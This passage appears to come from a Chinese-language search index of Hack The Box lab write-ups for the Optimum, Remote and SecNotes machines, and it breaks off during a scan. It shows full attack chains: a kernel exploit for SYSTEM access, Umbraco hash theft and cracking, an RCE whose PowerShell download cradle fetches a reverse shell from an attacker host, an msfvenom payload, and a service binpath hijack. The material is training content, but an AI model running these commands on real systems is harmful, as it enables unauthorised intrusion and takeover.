 HTB\nLogon Server:              N/A\nHotfix(s):                 31 Hotfix(s) Installed.\n                           [01]: KB2959936\n                           [02]: KB2896496\n                           [03]: KB2919355\n                           [04]: KB2920189\n                           [05]: KB2928120\n                           [06]: KB2931358\n                           [07]: KB2931366\n                           [08]: KB2933826\n                           [09]: KB2938772\n                           [10]: KB2949621\n                           [11]: KB2954879\n                           [12]: KB2958262\n                           [13]: KB2958263\n                           [14]: KB2961072\n                           [15]: KB2965500\n                           [16]: KB2966407\n                           [17]: KB2967917\n                           [18]: KB2971203\n                           [19]: KB2971850\n                           [20]: KB2973351\n                           [21]: KB2973448\n                           [22]: KB2975061\n                           [23]: KB2976627\n                           [24]: KB2977629\n                           [25]: KB2981580\n                           [26]: KB2987107\n                           [27]: KB2989647\n                           [28]: KB2998527\n                           [29]: KB3000850\n                           [30]: KB3003057\n                           [31]: KB3014442\nNetwork Card(s):           1 NIC(s) Installed.\n                           [01]: Intel(R) 82574L Gigabit Network Connection\n                                 Connection Name: Ethernet0\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: 10.10.10.8\nHyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.\n</code></pre> <p>\u4fdd\u5b58\u8f93\u51fa\u4e3asysteminfo.txt</p>"},{"location":"CTF/HTB/Windows-Optimum/index.html#windows-exploit-suggesterpy","title":"\u6267\u884cwindows-exploit-suggester.py","text":"<pre><code># \u6570\u636e\u5e93\u5347\u7ea7\nroot@kali:~/Windows-Exploit-Suggester# python windows-exploit-suggester.py -u\n...\n[+] writing to file 2024-05-06-mssb.xls\n...\nroot@kali:~/Windows-Exploit-Suggester# ls\n2024-05-06-mssb.xls  LICENSE.md  README.md  systeminfo.txt  windows-exploit-suggester.py\n# \u67e5\u770b\u53ef\u5229\u7528\u7684\u6f0f\u6d1e\nroot@kali:~/Windows-Exploit-Suggester# python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024-05-06-mssb.xls\n[*] initiating winsploit version 3.3...\n[*] database file detected as xls or xlsx based on extension\n[*] attempting to read from the systeminfo input file\n[+] systeminfo input file read successfully (utf-8)\n[*] querying database file for potential vulnerabilities\n[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits\n[*] there are now 246 remaining vulns\n[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin\n[+] windows version identified as 'Windows 2012 R2 64-bit'\n[*] \n...\n[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important\n[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)\n[*] \n...\n</code></pre> <p>E]\u8868\u793aexploited poc\uff0c\u53ef\u4ee5\u76f4\u63a5\u7528searchsploit\u83b7\u53d6POC\uff1a</p> <p></p> <p>\u7ecf\u8fc7\u5bf9\u6bd4\uff0c\u53d1\u73b0\u4ee5\u4e0b\u6f0f\u6d1e\u6bd4\u8f83\u5408\u9002\uff1a</p> <pre><code>[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important\n[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)\n</code></pre>"},{"location":"CTF/HTB/Windows-Optimum/index.html#ms16-098","title":"\u6267\u884cms16-098","text":"<p>\u5728\u8fd9\u91cc\u6211\u4f7f\u7528MS16-098\u8fdb\u884c\u63d0\u6743\uff0cexp\u7684\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1ahttps://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits/41020.exe, \u5c06\u6587\u4ef6\u4e0b\u8f7d\u5230kali\u653b\u51fb\u673a\u3002</p> <p>\u5c06exp\u6587\u4ef6\u4e0a\u4f20\u5230\u9776\u673a,\u6267\u884c41020.exe\u6587\u4ef6\u8fdb\u884c\u63d0\u6743\uff0c\u6210\u529f\u63d0\u6743\u3002</p> <pre><code>msf5 &gt; wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe\n[*] exec: wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe\n\n--2020-02-04 05:02:23--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe\nResolving github.com (github.com)... 13.250.177.223\nConnecting to github.com (github.com)|13.250.177.223|:443... connected.\nHTTP request sent, awaiting response... 302 Found\nLocation: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/41020.exe [following]\n--2020-02-04 05:02:27--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/41020.exe\nResolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.108.133\nConnecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.108.133|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 560128 (547K) [application/octet-stream]\nSaving to: \u201841020.exe\u2019\n\n41020.exe                                           100%[==================================================================================================================&gt;] 547.00K   756KB/s    in 0.7s    \n\n2020-02-04 05:02:28 (756 KB/s) - \u201841020.exe\u2019 saved [560128/560128]\n\nmsf5 &gt; sessions 3\n[*] Starting interaction with 3...\n\nmeterpreter &gt; upload 41020.exe\n[*] uploading  : 41020.exe -&gt; 41020.exe\n[*] Uploaded 547.00 KiB of 547.00 KiB (100.0%): 41020.exe -&gt; 41020.exe\n[*] uploaded   : 41020.exe -&gt; 41020.exe\nmeterpreter &gt; shell\nProcess 2612 created.\nChannel 4 created.\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\kostas\\Desktop&gt;whoami\nwhoami\noptimum\\kostas\n\nC:\\Users\\kostas\\Desktop&gt;41020.exe\n41020.exe\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\kostas\\Desktop&gt;whoami\nwhoami\nnt authority\\system\n</code></pre>"},{"location":"CTF/HTB/Windows-Remote/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Remote/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.180 -oA scans/ports\n...\nPORT      STATE SERVICE\n21/tcp    open  ftp\n80/tcp    open  http\n111/tcp   open  rpcbind\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n2049/tcp  open  nfs\n5985/tcp  open  wsman\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49678/tcp open  unknown\n49679/tcp open  unknown\n49680/tcp open  unknown\n...\nroot@kali# nmap -sV -sC -p 21,80,111,135,139,445,2049,5985,47001 -oA scans/nmap-tcpscripts 10.10.10.180\n...\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|_  SYST: Windows_NT\n80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Home - Acme Widgets\n111/tcp   open  rpcbind       2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/tcp6  rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  2,3,4        111/udp6  rpcbind\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n2049/tcp  open  mountd        1-3 (RPC #100005)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 2m38s\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2020-03-22T18:57:11\n|_  start_date: N/A\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-Remote/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<p>80\u7aef\u53e3\u6253\u5f00\u540e\u50cf\u662f\u4e00\u4e2a\u4ecb\u7ecd\u9875\u9762\uff0c\u6ca1\u53d1\u73b0\u6709\u5565\u6709\u7528\u7684\u4e1c\u897f\uff0c\u5c1d\u8bd5\u7206\u7834</p> <pre><code>root@kali# gobuster dir -u http://10.10.10.180 -w /usr/share/wordlists/Web-Content/common.txt -t 30 --no-error\n...\n/Home                 (Status: 200) [Size: 6703]\n/Blog                 (Status: 200) [Size: 5011]\n/Contact              (Status: 200) [Size: 7890]\n/Products             (Status: 200) [Size: 5338]\n/blog                 (Status: 200) [Size: 5001]\n/contact              (Status: 200) [Size: 7880]\n/home                 (Status: 200) [Size: 6703]\n/install              (Status: 302) [Size: 126] [--&gt; /umbraco/]\n/intranet             (Status: 200) [Size: 3323]               \n/master               (Status: 500) [Size: 3420]               \n/people               (Status: 200) [Size: 6739]               \n/person               (Status: 200) [Size: 2741]               \n/products             (Status: 200) [Size: 5328]               \n/product              (Status: 500) [Size: 3420]               \n/render/https://www.google.com (Status: 400) [Size: 3420]      \n/umbraco              (Status: 200) [Size: 4040]\n...\n##\u5b58\u5728\u4e00\u4e2a\u53ebumbraco\u7684cms\uff0c\u7ee7\u7eed\u7206\u7834\nroot@kali# gobuster dir -u http://10.10.10.180/umbraco -w /usr/share/wordlists/Web-Content/common.txt -t 30 --no-error\n...\n/Default              (Status: 200) [Size: 4040]\n/Members              (Status: 301) [Size: 159] [--&gt; http://10.10.10.180/umbraco/Members/]\n/Search               (Status: 301) [Size: 158] [--&gt; http://10.10.10.180/umbraco/Search/] \n/actions              (Status: 301) [Size: 159] [--&gt; http://10.10.10.180/umbraco/actions/]\n/application          (Status: 200) [Size: 2455]                                          \n/assets               (Status: 301) [Size: 158] [--&gt; http://10.10.10.180/umbraco/assets/] \n/config               (Status: 301) [Size: 158] [--&gt; http://10.10.10.180/umbraco/config/] \n/controls             (Status: 301) [Size: 160] [--&gt; http://10.10.10.180/umbraco/controls/]\n/create               (Status: 301) [Size: 158] [--&gt; http://10.10.10.180/umbraco/create/]  \n/dashboard            (Status: 301) [Size: 161] [--&gt; http://10.10.10.180/umbraco/dashboard/]\n/default              (Status: 200) [Size: 4040]                                            \n/developer            (Status: 301) [Size: 161] [--&gt; http://10.10.10.180/umbraco/developer/]\n/dialogs              (Status: 301) [Size: 159] [--&gt; http://10.10.10.180/umbraco/dialogs/]  \n/install              (Status: 301) [Size: 159] [--&gt; http://10.10.10.180/umbraco/install/]  \n/js                   (Status: 301) [Size: 154] [--&gt; http://10.10.10.180/umbraco/js/]       \n/lib                  (Status: 301) [Size: 155] [--&gt; http://10.10.10.180/umbraco/lib/]      \n/masterpages          (Status: 301) [Size: 163] [--&gt; http://10.10.10.180/umbraco/masterpages/]\n/members              (Status: 301) [Size: 159] [--&gt; http://10.10.10.180/umbraco/members/]    \n/plugins              (Status: 301) [Size: 159] [--&gt; http://10.10.10.180/umbraco/plugins/]    \n/preview              (Status: 302) [Size: 125] [--&gt; /umbraco]                                \n/render/https://www.google.com (Status: 400) [Size: 3420]                                     \n/search               (Status: 301) [Size: 158] [--&gt; http://10.10.10.180/umbraco/search/]     \n/settings             (Status: 301) [Size: 160] [--&gt; http://10.10.10.180/umbraco/settings/]   \n/views                (Status: 301) [Size: 157] [--&gt; http://10.10.10.180/umbraco/views/]      \n/webservices          (Status: 301) [Size: 163] [--&gt; http://10.10.10.180/umbraco/webservices/]\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-Remote/index.html#web","title":"WEB\u9875\u9762","text":"<p>10.10.10.180\uff1a</p> <p></p> <p>\u627e\u5230\u4e00\u4e2a\u767b\u9646\u70b9\uff0chttp://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms\uff1a</p> <p></p>"},{"location":"CTF/HTB/Windows-Remote/index.html#_2","title":"\u6f0f\u6d1e\u68c0\u6d4b\u4e0e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Remote/index.html#80","title":"80","text":"<p>\u53d1\u73b0umbraco\u76847.12.4\u7248\u672c\u5b58\u5728\u4e00\u4e2aRCE\uff0c\u4f46\u662f\u9700\u8981\u8d26\u53f7\u548c\u5bc6\u7801\u3002</p>"},{"location":"CTF/HTB/Windows-Remote/index.html#ftp-tcp-21","title":"FTP - TCP 21","text":"<p>FTP \u662f\u5f00\u653e\u7684\uff0c\u5141\u8bb8\u533f\u540d\u8bbf\u95ee\u3002\u8fde\u63a5\u540e\u53d1\u73b0\u6839\u76ee\u5f55\u662f\u7a7a\u7684\uff0c\u4e5f\u4e0d\u53ef\u4ee5\u4e0a\u4f20\u3002</p> <pre><code>root@kali# ftp 10.10.10.180                                                                                                                                 \nConnected to 10.10.10.180.\n220 Microsoft FTP Service\nName (10.10.10.180:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\nftp&gt; ls\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n226 Transfer complete.\n</code></pre>"},{"location":"CTF/HTB/Windows-Remote/index.html#smb-tcp-445","title":"SMB - TCP 445","text":"<p>\u65e0\u6cd5\u8bbf\u95ee\u4efb\u4f55\u5171\u4eab</p> <pre><code>root@kali# smbclient -N -L //10.10.10.180\nsession setup failed: NT_STATUS_ACCESS_DENIED\n\nroot@kali# smbmap -H 10.10.10.180\n[+] Finding open SMB ports....\n[!] Authentication error on 10.10.10.180\n[!] Authentication error on 10.10.10.180\n</code></pre>"},{"location":"CTF/HTB/Windows-Remote/index.html#nsf-tcp-2049","title":"NSF - TCP 2049","text":"<p>NFS \u5728 HTB \u673a\u5668\u4e0a\u975e\u5e38\u7f55\u89c1\uff0c\u56e0\u6b64\uff0c\u5b83\u7684\u5f00\u653e\u6027\u7edd\u5bf9\u503c\u5f97\u5173\u6ce8\u3002\u67e5\u770b\u9776\u673a\u7684\u5206\u4eab\u76ee\u5f55\uff1a</p> <pre><code>root@kali# showmount -e 10.10.10.180\nExport list for 10.10.10.180:\n/site_backups (everyone)\n## \u628a\u5b83\u6302\u8f7d\u5230\u6211\u7684\u4e3b\u673a\u4e0a\uff1a/mnt\nroot@kali# mount -t nfs 10.10.10.180:/site_backups /mnt/\n## \u67e5\u770b\u5206\u4eab\u5185\u5bb9\nroot@kali:/mnt# ls\nApp_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx \nGlobal.asax Media  scripts  Umbraco  Umbraco_Client  Views  Web.config    \n## \u67e5\u627e\u5206\u4eab\u76ee\u5f55\u5185\u542b\u6709pass\u5b57\u6837\u6587\u4ef6\nroot@kali# find ./|xargs grep -ri 'pass' -l                                                              130 \u2a2f\n./App_Data/Logs/UmbracoTraceLog.intranet.txt\n./App_Data/Logs/UmbracoTraceLog.intranet.txt.2020-02-19\n./App_Data/Models/all.generated.cs\n./App_Data/Models/models.generated.cs\n</code></pre> <p>\u5728Web.config\u786e\u8ba4cms\u7248\u672c\u53f7\u4e3a\uff1a7.12.4,\u6b63\u662f\u4e0a\u9762\u5b58\u5728rce\u7684\u7248\u672c\u3002</p> <p>\u5728<code>App_Data/Logs/UmbracoTraceLog.intranet.txt</code>\u4e0b\u627e\u5230\u4e00\u4e2a\u767b\u9646\u7528\u6237\u540d\uff1a<code>admin@htb.local</code></p> <pre><code>## \u518d\u6b21\u67e5\u627e\u5206\u4eab\u76ee\u5f55\u5185\u542b\u6709admin@htb.local\u5b57\u6837\u6587\u4ef6\nroot@kali# find ./|xargs grep -ri 'admin@htb.local' -l                                                   130 \u2a2f\n./App_Data/Logs/UmbracoTraceLog.intranet.txt\n./App_Data/Logs/UmbracoTraceLog.intranet.txt.2020-02-19\n./App_Data/Logs/UmbracoTraceLog.remote.txt\n./App_Data/Umbraco.sdf\n## \u5728App_Data/Umbraco.sdf\u4e0b\u627e\u5230\u76f8\u5173\u5b57\u6837\uff0c\u628a\u8fd9\u4e2a\u6587\u4ef6\u91cd\u5b9a\u5411\u5230kali\nroot@kali# strings App_Data/Umbraco.sdf &gt;/root/htb/Remote/umbraco.txt\n</code></pre> <p>\u5c06\u4f4d\u4e8e App_Data/Umbraco.sdf \u6587\u4ef6\u4e2d\u7684\u5b57\u7b26\u4e32\u63d0\u53d6\u51fa\u6765\uff0c\u5e76\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u8f93\u51fa\u5230 /root/htb/Remote/umbraco.txt \u6587\u4ef6\u4e2d\u3002\u7b80\u5355\u6765\u8bf4\uff0c\u5b83\u628a\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u6587\u672c\u63d0\u53d6\u51fa\u6765\u5e76\u4fdd\u5b58\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u4e2d\u3002</p> <pre><code>root@kali# head umbraco.txt \nAdministratoradmindefaulten-US\nAdministratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d\nAdministratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d\nadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50\nadminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f\nsmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e\nssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749\nssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={\"hashAlgorithm\":\"HMACSHA256\"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32\n@{pv\nqpkaj\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7206\u51fa\u4e86\u51e0\u4e2a\u7528\u6237\u540d\uff0c\u54c8\u5e0c\u5bc6\u7801\uff0c\u4ee5\u53ca\u54c8\u5e0c\u7b97\u6cd5\uff0c\u6574\u7406\u5982\u4e0b</p> <ol> <li>\u7528\u6237\u540d\uff1aadmin@htb.local \u54c8\u5e0c\uff1ab8be16afba8c314ad33d812f22a04991b90e2aaa \u54c8\u5e0c\u7b97\u6cd5\uff1aSHA1</li> <li>\u7528\u6237\u540d\uff1asmith@htb.local \u54c8\u5e0c\uff1ajxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= \u54c8\u5e0c\u7b97\u6cd5\uff1aHMACSHA256</li> <li>\u7528\u6237\u540d\uff1assmith@htb.local \u54c8\u5e0c\uff1a8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA= \u54c8\u5e0c\u7b97\u6cd5\uff1aHMACSHA256</li> </ol> <p></p> <p>\u89e3\u51fa\u6765\u7528\u6237admin@htb.local\u5bc6\u7801\u54c8\u5e0c\u660e\u6587\uff1abaconandcheese\uff0c\u4e0a\u9762\u7528\u6237\u51ed\u636e\u53ef\u4ee5\u767b\u5f55cms</p>"},{"location":"CTF/HTB/Windows-Remote/index.html#shell","title":"\u53cd\u5f39shell","text":"<p>Exp\uff1ahttps://github.com/noraj/Umbraco-RCE</p> <p>\u653b\u51fb\uff1a</p> <pre><code>root@kali# python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180/' -c powershell.exe -a \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')\"\n</code></pre> <p>\u6536\u5230\u4e00\u4e2a\u53cd\u5f39shell:</p> <pre><code>root@kali# nc -lnvp 4242                     \nlistening on [any] 4242 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.10.10.180] 49724\nWindows PowerShell running as user REMOTE$ on REMOTE\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\windows\\system32\\inetsrv&gt;whoami\niis apppool\\defaultapppool\nPS C:\\windows\\system32\\inetsrv&gt;\n</code></pre>"},{"location":"CTF/HTB/Windows-Remote/index.html#_3","title":"\u63d0\u6743","text":""},{"location":"CTF/HTB/Windows-Remote/index.html#winpeas","title":"\u4f20winpeas\u5230\u9776\u673a","text":"<pre><code>(new-object System.Net.WebClient).DownloadFile('http://10.10.14.3:8000/winPEASx64.exe','C:\\users\\public\\winPEASx64.exe')\n</code></pre> <p>WinPEAS.exe\u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.ddosi.org/peass-ng/#%E2%91%A0WinPEAS%E7%94%A8%E6%B3%95%E5%8F%8A%E8%AF%B4%E6%98%8E</p> <p>\u6267\u884c\uff1a</p> <pre><code>&amp; \"C:\\users\\public\\winPEASx64.exe\"\n</code></pre> <p>&amp;\u662f PowerShell \u4e2d\u7684\u8c03\u7528\u64cd\u4f5c\u7b26\uff0c\u5b83\u5141\u8bb8\u4f60\u6267\u884c\u6307\u5b9a\u8def\u5f84\u4e0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u811a\u672c\u3002</p>"},{"location":"CTF/HTB/Windows-Remote/index.html#_4","title":"\u670d\u52a1\u63d0\u6743","text":"<p>\u53d1\u73b0\u62e5\u6709\u5f00\u542f\u548c\u5173\u95ed\u4e00\u4e2aRmSvc\u670d\u52a1\u7684\u6743\u9650</p> <pre><code>Modifiable Services\nZ% Check if you can modify any service https://book.hacktricks.xyz/windows/windows-loc\nal-privilege-escalation#services                                                                        \n    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:\n    RmSvc: GenericExecute (Start/Stop)\n    UsoSvc: AllAccess, Start\n</code></pre> <p>RmSvc\uff1a</p> <ul> <li> <p>\u6743\u9650\uff1a GenericExecute\uff08\u542f\u52a8/\u505c\u6b62\uff09</p> </li> <li> <p>\u89e3\u91ca\uff1a \u8fd9\u8868\u660e\u4f60\u62e5\u6709\u5bf9\u540d\u4e3a \"RmSvc\" \u7684\u670d\u52a1\u8fdb\u884c\u542f\u52a8\u548c\u505c\u6b62\u7684\u6743\u9650\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u4f60\u53ef\u4ee5\u542f\u52a8\u548c\u505c\u6b62\u8fd9\u4e2a\u670d\u52a1\uff0c\u4f46\u662f\u6ca1\u6709\u63d0\u53ca\u4fee\u6539\u914d\u7f6e\u7684\u6743\u9650\u3002</p> </li> </ul> <p>UsoSvc\uff1a</p> <ul> <li>\u6743\u9650\uff1a AllAccess\uff08\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\uff09\u3001Start\uff08\u542f\u52a8\uff09</li> <li>\u89e3\u91ca\uff1a \u8fd9\u8868\u660e\u4f60\u5bf9\u540d\u4e3a \"UsoSvc\" \u7684\u670d\u52a1\u62e5\u6709\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\uff0c\u5e76\u4e14\u53ef\u4ee5\u542f\u52a8\u8fd9\u4e2a\u670d\u52a1\u3002\"AllAccess\" \u610f\u5473\u7740\u4f60\u6709\u5bf9\u8be5\u670d\u52a1\u7684\u5168\u90e8\u6743\u9650\uff0c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u7b49\u64cd\u4f5c\u3002</li> </ul> <p>PS\u4e0b\u67e5\u770b\u8fd9\u4e2a\u670d\u52a1\u7684\u4fe1\u606f</p> <pre><code>PS C:\\&gt; sc.exe qc UsoSvc\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: UsoSvc\n        TYPE               : 20  WIN32_SHARE_PROCESS \n        START_TYPE         : 2   AUTO_START  (DELAYED)\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Windows\\system32\\svchost.exe -k netsvcs -p\n        LOAD_ORDER_GROUP   : \n        TAG                : 0\n        DISPLAY_NAME       : Update Orchestrator Service\n        DEPENDENCIES       : rpcss\n        SERVICE_START_NAME : LocalSystem\n</code></pre> <p>sc.exe qc UsoSvc \u662f\u4e00\u4e2a\u7528\u4e8e Windows \u64cd\u4f5c\u7cfb\u7edf\u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002\u5b83\u4e3b\u8981\u7528\u4e8e\u67e5\u8be2\u670d\u52a1\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\"UsoSvc\" \u662f\u670d\u52a1\u7684\u540d\u79f0\uff0c\u5b83\u6307\u7684\u662f\u201cUpdate Orchestrator Service\u201d\uff0c\u8fd9\u662f Windows Update \u7684\u4e00\u90e8\u5206\uff0c\u8d1f\u8d23\u7ba1\u7406\u66f4\u65b0\u7684\u5b89\u88c5\u548c\u914d\u7f6e\u3002</p> <p>\u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u67e5\u8be2\u5e76\u663e\u793a\u540d\u4e3a \"UsoSvc\" \u7684\u670d\u52a1\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u5b83\u4f1a\u663e\u793a\u51fa\u670d\u52a1\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6bd4\u5982\u670d\u52a1\u7684\u540d\u79f0\u3001\u663e\u793a\u540d\u79f0\u3001\u63cf\u8ff0\u3001\u8def\u5f84\u3001\u542f\u52a8\u7c7b\u578b\u3001\u542f\u52a8\u53c2\u6570\u7b49\u7b49\u3002</p> <p>\u4fee\u6539\u8fd9\u4e2a\u670d\u52a1\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u8def\u5f84</p> <pre><code>PS C:\\&gt; sc.exe config UsoSvc binpath= \"C:\\Users\\Public\\shell.exe\"\n[SC] ChangeServiceConfig SUCCESS\n</code></pre> <p>\u5c06\u670d\u52a1 \"UsoSvc\" \u7684\u4e8c\u8fdb\u5236\u8def\u5f84\u4fee\u6539\u4e3a \"C:\\Users\\Public\\shell.exe\"\uff0c\u8fd9\u6837\uff0c\u5f53\u8fd9\u4e2a\u670d\u52a1\u88ab\u542f\u52a8\u65f6\uff0c\u5b83\u5c06\u6267\u884c\u4f4d\u4e8e\u8fd9\u4e2a\u8def\u5f84\u4e0b\u7684 \"shell.exe\" \u6587\u4ef6\u3002</p> <p>\u7f16\u8bd1\u4e00\u4e2a\u53cd\u5f39shell\u6587\u4ef6</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o shell.exe\n</code></pre> <p>\u4e0b\u8f7d\u5230\u9776\u673a</p> <pre><code>(new-object System.Net.WebClient).DownloadFile('http://10.10.14.3:8000/shell.exe','C:\\users\\public\\shell.exe')\n</code></pre> <p>\u91cd\u542f\u670d\u52a1</p> <pre><code>net stop UsoSvc\nnet start UsoSvc\n</code></pre> <p>\u62ff\u5230\u53cd\u5f39shell</p> <pre><code>exploit(multi/handler) &gt; run\n\n[*] Started reverse TCP handler on 10.10.14.3:4444 \n[*] Sending stage (200262 bytes) to 10.10.10.180\n[*] Meterpreter session 1 opened (10.10.14.3:4444 -&gt; 10.10.10.180:49863) at 2021-12-26 11:20:13 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\uff0cshell\u5f88\u5feb\u5c31\u4f1a\u65ad\u6389\uff0c\u9700\u8981\u91cd\u65b0\u8fde\u63a5\u3002</p>"},{"location":"CTF/HTB/Windows-SecNotes/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-SecNotes/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.97\n...\nPORT     STATE SERVICE\n80/tcp   open  http\n445/tcp  open  microsoft-ds\n8808/tcp open  ssports-bcast\n...\nroot@kali# nmap -sC -sV -p 80,445,8808 -oA nmap/details 10.10.10.97\n...\nPORT     STATE SERVICE      VERSION\n80/tcp   open  http         Microsoft IIS httpd 10.0\n| 